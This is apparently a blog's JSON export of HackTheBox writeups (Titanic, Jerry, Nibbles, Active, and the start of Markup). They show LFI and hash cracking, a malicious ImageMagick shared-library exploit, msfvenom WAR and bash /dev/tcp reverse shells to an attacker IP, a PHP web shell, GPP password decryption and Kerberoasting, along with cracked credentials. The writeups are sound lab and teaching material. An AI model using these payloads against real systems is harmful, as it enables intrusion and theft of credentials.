[{"content":"Titanic Title Titanic Description Writeup for the \u0026ldquo;Titanic\u0026rdquo; machine on HackTheBox. It involves exploiting LFI to discover sensitive Gitea configuration and database files, cracking PBKDF2 hashes for SSH access, and escalating privileges via a shared library injection in ImageMagick (CVE-2024-41817). Difficulty Easy Maker ruycr4ft Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # Nmap 7.95 scan initiated Thu Jun 19 16:00:52 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.11.55 Nmap scan report for titanic.htb (10.10.11.55) Host is up (0.040s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA) |_ 256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519) 80/tcp open http Apache httpd 2.4.52 | http-methods: |_ Supported Methods: HEAD GET OPTIONS |_http-title: Titanic - Book Your Ship Trip |_http-favicon: Unknown favicon MD5: 79E1E0A79A613646F473CFEDA9E231F1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jun 19 16:01:15 2025 -- 1 IP address (1 host up) scanned in 22.26 seconds We can see there are 2 ports open. 22 and 80, let\u0026rsquo;s see what we can get on port 80.\nThere is nothing on homepage except this form for booking. When I tried to book, it downloaded json file with the data. Let\u0026rsquo;s open it in burpsuite to see what is going on behind the scenes!\nSo basically there are 2 requests going on in the backend, the first one is post request where it is redirecting us to download ticket page.\nSecond is where the ticket is getting downloaded.\nNow, just out of curiosity and as the parameter is download a file from json, let\u0026rsquo;s try to read /etc/passwd file.\nSo there is an LFI! But after enumerating to certain path, I cannot be able to find anything useful. So I have tried to look for subdomains.\nSubdomain Enumeration └─$ ffuf -H \u0026#34;Host: FUZZ.titanic.htb\u0026#34; -u http://titanic.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 20\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\\r/\\ \\__/ /\\ \\__/ __ __ /\\ \\__/\r\\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\r\\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\r\\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\\r\\/_/ \\/_/ \\/___/ \\/_/\rv2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://titanic.htb\r:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt\r:: Header : Host: FUZZ.titanic.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response words: 20\r________________________________________________\rdev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 35ms] Found one subdomain dev and added it to /etc/hosts. On visiting the subdomain we can see it\u0026rsquo;s Gitea page.\nThere are 2 repositories - the flask-app contains the source code of the app, and docker-config contains the docker-compose files. In mysql folder, password is getting exposed MySQLP@$$w0rd!.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#34;3.8\u0026#34; services: mysql: image: mysql:8.0 container_name: mysql ports: - \u0026#34;127.0.0.1:3306:3306\u0026#34; environment: MYSQL_ROOT_PASSWORD: \u0026#34;MySQLP@$$w0rd!\u0026#34; MYSQL_DATABASE: tickets MYSQL_USER: sql_svc MYSQL_PASSWORD: sql_password restart: always But there is no such user when we check /etc/passwd from LFI earlier. But if we see the Gitea website at dev subdomain, we can see the account name is developer. So I have tried to login with that username and the mysql password into ssh but that didn\u0026rsquo;t work.\nMoreover, in the footer it says Powered by Gitea Version: 1.22.1 but I don\u0026rsquo;t think there is any vulnerability with that version that will help us to get the shell.\nIf we look at that other docker-compose.yaml file,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#34;3\u0026#34; services: gitea: image: gitea/gitea container_name: gitea ports: - \u0026#34;127.0.0.1:3000:3000\u0026#34; - \u0026#34;127.0.0.1:2222:22\u0026#34; # Optional for SSH access volumes: - /home/developer/gitea/data:/data # Replace with your path environment: - USER_UID=1000 - USER_GID=1000 restart: always then we can see the volume is at /home/developer/gitea/data. So after googling I found that there is an app.ini file located at /conf/app.ini in gitea folder. So the path will be\n/home/developer/gitea/data/gitea/conf/app.ini\nFrom the response, we got the database path (/data/gitea/gitea.db), let\u0026rsquo;s try to get what\u0026rsquo;s in db. But as per the volume mentioned above, it will be at /home/developer/gitea/data/gitea/gitea.db.\nDownload the file using wget: wget 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -O gitea.db User Flag Exploring Gitea Database \u0026gt; sqlite3 gitea.db\rto open the database\r\u0026gt; .tables\rto list all the tables\r\u0026gt; sqlite\u0026gt; select * from user;\r1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0\r2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0\r3|ariti|ariti||ariti@ariti.com|0|enabled|36c72ab42c6dcb1d3be7804adc51e39139e96d7d108de666514169b9ec98724ca8210476cdee15e9326b7c8eda55dce00c15|pbkdf2$50000$50|0|0|0||0|||915fa2dbfd541a543b86bc5e91ac41d7|b669965b11d556a94ac70f66501e497f|en-US||1750427942|1750427942|1750427942|0|-1|1|0|0|0|0|1|0|35ccf5eb8e540c4af76b9cd5150b5966|ariti@ariti.com|0|0|0|0|0|0|0|0|0||gitea-auto|0 If we open it in sqlite DB Browser, it will look something like this,\nI found this amazing technique from 0xdf that will make our life easier in cracking PBKDF2 hashes. Here are the steps we will follow to get the password.\nget all the hashes: sqlite3 gitea.db \u0026quot;select passwd,salt,name from user\u0026quot; | while read data; do digest=$(echo \u0026quot;$data\u0026quot; | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo \u0026quot;$data\u0026quot; | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo \u0026quot;${name}:sha256:50000:${salt}:${digest}\u0026quot;; done | tee gitea.hashes crack using hashcat: hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user get cracked hashes: hashcat gitea.hashes --show --user developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528\rariti:sha256:50000:tmmWWxHVVqlKxw9mUB5Jfw==:NscqtCxtyx0754BK3FHjkTnpbX0QjeZmUUFpueyYckyoIQR2ze4V6TJrfI7aVdzgDBU=:123456789 User Password developer 25282528 ariti 123456789 Let\u0026rsquo;s try to get into developer using the creds.\n1 2 developer@titanic:~$ cat user.txt 798ada2be2e573f219fcf4cc25069fb3 User Flag: 798ada2be2e573f219fcf4cc25069fb3\nRoot Flag The first step is to run linpeas and hoping we will get something useful from the script. I didn\u0026rsquo;t found anything useful from the script. Although there were some things but it didn\u0026rsquo;t lead to privilege escalation. But there is something in /opt.\nThere are 3 folders.\napp -\u0026gt; contains the source code of website containerd -\u0026gt; permission deined scripts -\u0026gt; There is a script inside it which is using magick. So let\u0026rsquo;s check the version of the binary. 1 2 3 4 developer@titanic:/opt/scripts$ cat identify_images.sh cd /opt/app/static/assets/images truncate -s 0 metadata.log find /opt/app/static/assets/images/ -type f -name \u0026#34;*.jpg\u0026#34; | xargs /usr/bin/magick identify \u0026gt;\u0026gt; metadata.log Version of magick\n1 2 3 4 5 6 7 developer@titanic:/opt/scripts$ /usr/bin/magick -version Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org Copyright: (C) 1999 ImageMagick Studio LLC License: https://imagemagick.org/script/license.php Features: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib Compiler: gcc (9.4) There is a CVE associated with it https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8 (CVE-2024-41817).\nIn order to get our flag, let\u0026rsquo;s try to follow similar steps form POC.\nWe will try to create libxcb.so.1 in /opt/app/static/assets/images. 1 2 3 4 5 6 7 8 9 10 gcc -x c -shared -fPIC -o ./libxcb.so.1 - \u0026lt;\u0026lt; EOF #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; __attribute__((constructor)) void init(){ system(\u0026#34;cat /root/root.txt \u0026gt; /tmp/ans.txt\u0026#34;); exit(0); } EOF 2. So from the script, we will read the root flag and then store in in tmp folder with ans.txt.\nRoot Flag: fa8ffe301f744d288b1ab346d4baeb7c\n","description":"Writeup for the \"Titanic\" machine on HackTheBox. It involves exploiting LFI to discover sensitive Gitea configuration and database files, cracking PBKDF2 hashes for SSH access, and escalating privileges via a shared library injection in ImageMagick (CVE-2024-41817).","id":0,"section":"posts","tags":["HackTheBox","HTB-titanic","ctf","lfi","gitea","pbkdf2","sqlite","hashcat","ssh","imagick","cve-2024-41817","privilege-escalation"],"title":"HackTheBox Writeup - Titanic Room","uri":"https://g4nd1v.github.io/posts/hackthebox-titanic/"},{"content":"Jerry Title Jerry Description Walkthrough of the \u0026ldquo;Jerry\u0026rdquo; machine on HackTheBox. It involves brute-forcing Tomcat Manager credentials, deploying a WAR reverse shell, and retrieving both user and root flags from a Windows system. Difficulty Easy Maker mrh4sh Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 └─$ cat nmap/tcp_default.nmap # Nmap 7.95 scan initiated Wed May 21 17:52:06 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.10.95 Nmap scan report for jerry.htb (10.10.10.95) Host is up (0.10s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Apache Tomcat/7.0.88 |_http-server-header: Apache-Coyote/1.1 |_http-favicon: Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests I have tried several CVEs for Tomcat/7.0.88 but none of them worked. Next, we will try to bruteforce Manager App in tomcat.\nIn order to brute force, we will use metasploit (scanner/http/tomcat_mgr_login)\nWe got tomcat:s3cret!\nFlags From this credentials, we got the dashboard.\nIt\u0026rsquo;s a very well known vulnerability. In this vulnerability we will make a reverse shell using msfvenom and choose war as file extension\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war \u0026gt; backup.war\nNow, upload the war file to deploy and start a Netcat listener and click on /backup to execute the shell.\nWe will get our flags in flags/ folder located in Administrator\u0026rsquo;s Desktop. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 C:\\Users\\Administrator\\Desktop\\flags\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 0834-6C04 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; . 06/19/2018 07:09 AM \u0026lt;DIR\u0026gt; .. 06/19/2018 07:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 2,419,470,336 bytes free C:\\Users\\Administrator\\Desktop\\flags\u0026gt;type * type * user.txt 7004dbcef0f854e0fb401875f26ebd00 root.txt 04a8b36e1545a455393d067e772fe90e ","description":"Walkthrough of the \"Jerry\" machine on HackTheBox. It involves brute-forcing Tomcat Manager credentials, deploying a WAR reverse shell, and retrieving both user and root flags from a Windows system.","id":1,"section":"posts","tags":["HackTheBox","HTB-jerry","ctf","tomcat","bruteforce","war-file","reverse-shell","metasploit","windows","privilege-escalation"],"title":"HackTheBox Writeup - Jerry Room","uri":"https://g4nd1v.github.io/posts/hackthebox-jerry/"},{"content":"Nibbles Title Nibbles Description Writeup for the \u0026ldquo;Nibbles\u0026rdquo; machine on HackTheBox. It involves discovering a vulnerable Nibbleblog CMS, exploiting it via Metasploit for initial access, and escalating privileges by abusing a writable script with sudo rights. Difficulty Easy Maker mrb3n8132 Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 └─$ cat nmap/tcp_default.nmap # Nmap 7.95 scan initiated Wed May 21 16:27:52 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.10.75 Nmap scan report for nibbles.htb (10.10.10.75) Host is up (0.11s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel So there are 2 ports that are open that is 22, and 80. Let\u0026rsquo;s check the website on port 80.\nThere is nothing in the website, but if we see the source code of the website, we will see the directory nibbleblog/. Let\u0026rsquo;s try to visit that directory and see if we can find anything out of there.\nThis looks some kind of CMS, if we look at the bottom of the webpage, we will see Powered by Nibbleblog. Let\u0026rsquo;s try to search that on google. We can see there is an exploit available in metasploit (https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/). Let\u0026rsquo;s try to check what are the requirements.\nFrom the options, we can verify that we will need username and password in order to execute the exploit.\nUser Flag I have used gobuster in order to bruteforce directories!\nIt seems, we have 2 directories - admin and content. I have enumerated both of the directories and found this useful file at http://nibbles.htb/nibbleblog/content/private/config.xml. Where it is leaking the username, that is admin and for password I am guessing it should be nibbles as it is shown in many places (not directly though!).\nLet\u0026rsquo;s try to run the exploit with admin:nibbles!\nWe got the shell! Use shell to get into the shell and get full tty using python3 -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' and get the user flag.\nUser Flag: ec180a499aa80095143496c7bff08041\nRoot Flag If we check sudo -l we will see,\n1 2 3 4 5 6 7 8 nibbler@Nibbles:/home/nibbler$ sudo -l sudo -l Matching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh Unzip personal.zip from home directory and check what is monitor.sh. If we check the permission of monitor.sh we will see we can change this file!\nnibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al monitor.sh\r-rwxrwxrwx 1 nibbler nibbler 4015 May 8 2015 monitor.sh We will use this in order to get the shell.\necho \u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.16/5555 0\u0026gt;\u0026amp;1'\u0026quot; \u0026gt; monitor.sh\nIn our nc session, we will get our shell\nRoot Flag: c8135e7d2b4d2abedbd9f0a77d13a553\nExtra Let\u0026rsquo;s try to do manual exploitation instead of metasploit. If we check the CVE on nist (https://nvd.nist.gov/vuln/detail/CVE-2015-6967) we will find the link of seclists\u0026rsquo;s blog. Let\u0026rsquo;s follow this blog and try to exploit step by step.\nGet username and password in order to login into the portal. admin:nibbles\nhttp://nibbles.htb/nibbleblog/admin.php\nNext, we will go to Plugins \u0026gt; My Image \u0026gt; Configure\nHere there is a file upload functionality, let\u0026rsquo;s make our shell and upload it to the website.\nShell -\u0026gt; shell.php contains \u0026lt;?php system($_REQUEST['cmd']); ?\u0026gt;.\nAfter uploading the shell, we will we will go to my image plugin in private/ folder\nhttp://nibbles.htb/nibbleblog/content/private/plugins/my_image/\nExecuting the shell\nhttp://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=id\nThat\u0026rsquo;s all for this blog! See you in the next one :) ","description":"Writeup for the \"Nibbles\" machine on HackTheBox. It involves discovering a vulnerable Nibbleblog CMS, exploiting it via Metasploit for initial access, and escalating privileges by abusing a writable script with sudo rights.","id":2,"section":"posts","tags":["HackTheBox","htb-nibbles","ctf","nibbleblog","cms","metasploit","file-upload","reverse-shell","sudo","privilege-escalation","bash-script"],"title":"HackTheBox Writeup - Nibbles Room","uri":"https://g4nd1v.github.io/posts/hackthebox-nibbles/"},{"content":"Active Title Active Description Walkthrough of the \u0026ldquo;Active\u0026rdquo; machine on HackTheBox, showcasing SMB enumeration, GPP password extraction, Kerberoasting, and gaining SYSTEM access via Impacket\u0026rsquo;s PsExec. Difficulty Easy Maker eks \u0026amp; mrb3n8132 Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 └─$ nmap -sC -sV -oA nmap/active 10.10.10.100 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 20:45 EDT Nmap scan report for 10.10.10.100 Host is up (0.093s latency). Not shown: 982 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-21 00:47:06Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49165/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: |_clock-skew: 1m34s | smb2-time: | date: 2025-05-21T00:48:04 |_ start_date: 2025-05-20T18:39:45 | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required From nmap results, we can see there are multiple ports that is open, and it seems it\u0026rsquo;s an active directory box! Let\u0026rsquo;s start by enumerating smb.\nSMB It allows anonymous login in SMB\n1 2 3 4 5 6 7 8 9 10 11 12 13 └─$ smbclient -L \\\\10.10.10.100 Password for [WORKGROUP\\kali]: Anonymous login successful Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk I have tried enumerating each shares but all are giving NT_STATUS_ACCESS_DENIED except Replication. There are number of files in this share so I think it will be better if we download all the files from smbclient.\n1 2 3 smb: \\active.htb\\\u0026gt; recurse ON smb: \\active.htb\\\u0026gt; prompt OFF smb: \\active.htb\\\u0026gt; mget * Let\u0026rsquo;s see if we can get anything out of these files. we can use grep and search for password or search for any other sensitive words.\n1 2 └─$ grep -Ri pass Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:\u0026lt;Groups clsid=\u0026#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}\u0026#34;\u0026gt;\u0026lt;User clsid=\u0026#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\u0026#34; name=\u0026#34;active.htb\\SVC_TGS\u0026#34; image=\u0026#34;2\u0026#34; changed=\u0026#34;2018-07-18 20:46:06\u0026#34; uid=\u0026#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}\u0026#34;\u0026gt;\u0026lt;Properties action=\u0026#34;U\u0026#34; newName=\u0026#34;\u0026#34; fullName=\u0026#34;\u0026#34; description=\u0026#34;\u0026#34; cpassword=\u0026#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026#34; changeLogon=\u0026#34;0\u0026#34; noChange=\u0026#34;1\u0026#34; neverExpires=\u0026#34;1\u0026#34; acctDisabled=\u0026#34;0\u0026#34; userName=\u0026#34;active.htb\\SVC_TGS\u0026#34;/\u0026gt;\u0026lt;/User\u0026gt; From this we can deduce,\nThe name is: name=\u0026quot;active.htb\\SVC_TGS\u0026quot; The password is: cpassword=\u0026quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u0026quot; It\u0026rsquo;s from Groups.xml file\nIf we google around about the terms cpassword or GPP Password we will find this tool that will decrypt the password, we will use cpassword which we got from smbshare and decrypt it. https://github.com/t0thkr1s/gpp-decrypt\nPassword: GPPstillStandingStrong2k18\nUser Pass svc_tgs GPPstillStandingStrong2k18 User Flag Now, we we enumerate User share using smbclient from this creds, we will get the user flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 smb: \\SVC_TGS\\\u0026gt; ls . D 0 Sat Jul 21 11:16:32 2018 .. D 0 Sat Jul 21 11:16:32 2018 Contacts D 0 Sat Jul 21 11:14:11 2018 Desktop D 0 Sat Jul 21 11:14:42 2018 Downloads D 0 Sat Jul 21 11:14:23 2018 Favorites D 0 Sat Jul 21 11:14:44 2018 Links D 0 Sat Jul 21 11:14:57 2018 My Documents D 0 Sat Jul 21 11:15:03 2018 My Music D 0 Sat Jul 21 11:15:32 2018 My Pictures D 0 Sat Jul 21 11:15:43 2018 My Videos D 0 Sat Jul 21 11:15:53 2018 Saved Games D 0 Sat Jul 21 11:16:12 2018 Searches D 0 Sat Jul 21 11:16:24 2018 5217023 blocks of size 4096. 278104 blocks available smb: \\SVC_TGS\\\u0026gt; cd Desktop smb: \\SVC_TGS\\Desktop\\\u0026gt; ls . D 0 Sat Jul 21 11:14:42 2018 .. D 0 Sat Jul 21 11:14:42 2018 user.txt AR 34 Tue May 20 14:40:54 2025 5217023 blocks of size 4096. 278104 blocks available smb: \\SVC_TGS\\Desktop\\\u0026gt; get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\SVC_TGS\\Desktop\\\u0026gt; !cat user.txt 7998c6ad0924df89a0d04aa098b02228 User Flag: 7998c6ad0924df89a0d04aa098b02228\nRoot Flag As we have creds from svc_tgs user, we will try Kerberoasting and the best tool to use is\nhttps://github.com/ShutdownRepo/targetedKerberoast 1 2 3 4 5 └─$ python3 targetedKerberoast.py -v -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 [*] Starting kerberoast attacks [*] Fetching usernames from Active Directory with LDAP [+] Printing hash for (Administrator) $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$195c00ebe8a0022774c5a271ef02a0ec$c09c7131eb54bcdd145a7cc4ebc5cf15d24815ec1c2a3b38e9c525b6a4f9f6510a158071d4077142a70bb50e6690f207f4ad0d12dfd89212c5b2af8e77d75f7cf4c8167c23e8ea945ed0a405259676600d8a9479633a275f082f6adc3415b0a813f9f659d34e5d028605b3221b2e287075eebd369dfb8a41f0f420ad23c9cf41a85a13b1d9639ef42ac2642ff8597f87485581d24d902dab390a07d95577812373f19843900b2008f2a2a721a69f4842f856f7c75bb997a73a0248e0dd07ad4290d45270170c1dccf47ab453286fd27d6e7166dd9bb4625aa64780b914f5874d4ac18707653a56c31f216b24c2bfa72bbbc40bb101011ec76e181aa2dcfb6f0332ecab142029409b278282562abcb41d334ee80af2b8efd04356205ca0b5092c1fe7ccf8709181bdb3fd948132d50a233b4b667edf413cd58731151bd5bd5c8b8d8e52394fd92c2175f2d416af49d6d6c368a022ae9ba148c3e08bb1384df2e8c2cb6977c36391dabe1f00c0b18c4c37fb902f54cca8ca5245f38ebd0fe6a474a312ebc16601dc52418acaa9ad22df37cdc09fad06e995a70155865765d65d9b98f6a9aaf269faf7ba664b9a1682e4b8b531be8afa30a8b54ef1e37fc6b9f5b899c86e4258054bf40ab216e1466282729fd5c25feceddd1eb4d8d69bcb0bdd540477dfc6ef055174eaa8fad8b0b1e77cc53889e3c923f65081f49ec0cf95542e5627b92389e6d3e7aded85a6b91b5229526f000f107d746672cc3edeb248ae7912bea38cb52527d17b43c24390f49d7f9271c0027cd6fadd8380567bfaf2f98a17ba8d1b9c381dbce34aa9eea67673b8d851d26c07634c34d6411d0714fc873f8ca414696b7f5bd3930ef0cc78b3de7538eac5684d3674e7e689a37f359db76366d1add80ac54e58651e1364eb2cea6e0f99789636bc108436e6ae0219d44015b74f71a71eaeb134e256c8f5962a1c4c74a00f24d712c8b720aa327e0c223c7f7e82ccf600fae74a1dbdccaa55394dc2fe81af9d3a6e789ef3e1fed087b52e1702ba6f13e4e5ece6654637ab7a73c0620515bb9a7c4eae7a9f383b664a356844f2758173ade77b8aa08a42fed1105aae7755c665a8d1aea2cdadc1c64c2519e0c8ada3cdb4a7b81d9d7c1cb7961b5444ad88f0c89443e2f1f1dc53410cf8f1899ee632d7bf1765f04463ecb2848c70e5e2e82443885da1adc136a5080646737158413e4dce997fc2cb566cb9f3184a5e2872e287a2297fa0d0ab We will make a file called admin.hash with this ticket and using john we can able to decrypt the hash.\nPassword: Ticketmaster1968\nUser Password Administrator Ticketmaster1968 Using impacket\u0026rsquo;s psexec we can able to get interactive shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 └─$ impacket-psexec active.htb/administrator:Ticketmaster1968@10.10.10.100 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file PkmJJObt.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service COiq on 10.10.10.100..... [*] Starting service COiq..... [!] Press help for extra shell commands Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt 3cad3a24fef49c9481845d7ed7942d6b Flag: 3cad3a24fef49c9481845d7ed7942d6b\n","description":"Walkthrough of the \"Active\" machine on HackTheBox, showcasing SMB enumeration, GPP password extraction, Kerberoasting, and gaining SYSTEM access via Impacket's PsExec.","id":3,"section":"posts","tags":["HackTheBox","htb-active","smb","gpp-password","kerberos","kerberoasting","ldap","impacket","psexec","windows-ad","privilege-escalation"],"title":"HackTheBox Writeup - Active Room","uri":"https://g4nd1v.github.io/posts/hackthebox-active/"},{"content":"Markup Title Markup Description Walkthrough of the \u0026ldquo;Markup\u0026rdquo; machine on HackTheBox, featuring enumeration, XML external entity (XXE) injection to gain a user shell, and privilege escalation via writable batch script to SYSTEM. Difficulty Very Easy Maker MrR3boot Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 └─$ nmap -sC -sV 10.129.16.158 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-20 17:21 EDT Nmap scan report for markup.htb (10.129.16.158) Host is up (0.060s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0) | ssh-hostkey: | 3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA) | 256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA) |_ 256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: MegaShopping |_http-server-header: Apache/2.4.41 (Win64) 